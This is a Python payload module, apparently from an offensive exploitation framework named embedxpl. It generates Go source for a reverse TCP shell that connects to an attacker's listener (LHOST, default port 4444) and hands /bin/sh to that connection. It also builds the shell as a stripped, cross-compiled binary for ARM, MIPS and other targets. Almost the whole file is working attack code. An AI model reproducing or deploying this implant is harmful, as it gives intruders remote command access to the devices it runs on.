"""Go Reverse TCP Implant.

Gera source Go de implant reverso TCP compilável via GoExecutor.
Zero dependências externas — apenas stdlib Go.
Cross-compila para qualquer arch via GOOS/GOARCH env vars.
"""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "Go Reverse TCP",
        "description": "Go native reverse TCP shell — cross-compiles for any arch/OS.",
        "authors": ("André Henrique (@mrhenrike)", "União Geek"),
    }

    options = {
        "LHOST": {"description": "Listener IP", "required": True, "default": "", "value": ""},
        "LPORT": {"description": "Listener port", "required": True, "default": "4444", "value": "4444"},
        "ARCH":  {"description": "GOARCH target (amd64/arm/arm64/mips/mipsle/riscv64)", "required": False, "default": "arm", "value": "arm"},
        "OS":    {"description": "GOOS target (linux/windows/darwin)", "required": False, "default": "linux", "value": "linux"},
    }

    def generate(self) -> bytes:
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]

        src = f'''package main

import (
	"net"
	"os"
	"os/exec"
)

func main() {{
	conn, err := net.Dial("tcp", "{lhost}:{lport}")
	if err != nil {{
		os.Exit(1)
	}}
	defer conn.Close()

	cmd := exec.Command("/bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}}
'''
        return src.encode()

    def compile_command(self) -> str:
        arch = self.options["ARCH"]["value"]
        goos = self.options["OS"]["value"]
        return (
            f"GOOS={goos} GOARCH={arch} CGO_ENABLED=0 "
            f"go build -ldflags '-s -w' -trimpath -o reverse_tcp_{arch} payload.go"
        )
